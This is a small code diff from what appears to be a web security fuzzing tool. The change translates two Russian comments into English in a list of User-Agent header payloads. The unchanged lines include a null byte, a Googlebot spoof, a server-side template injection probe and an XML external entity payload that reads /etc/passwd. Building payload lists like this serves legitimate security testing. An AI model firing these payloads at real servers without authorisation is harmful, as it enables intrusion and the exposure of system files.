@@ -494,8 +494,8 @@ export const BASE_PAYLOADS: Record<string, PayloadCategory> = {
 	'User-Agent': {
 		type: 'Header',
 		payloads: [
-			'User-Agent:', // пустой
-			'User-Agent: \x00', // нуль-байт
+			'User-Agent:', // empty
+			'User-Agent: \x00', // null byte
 			'User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)', // Googlebot
 			'User-Agent: {{7*7}}', // SSTI
 			'User-Agent: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>]><foo>&xxe;</foo>', // XXE
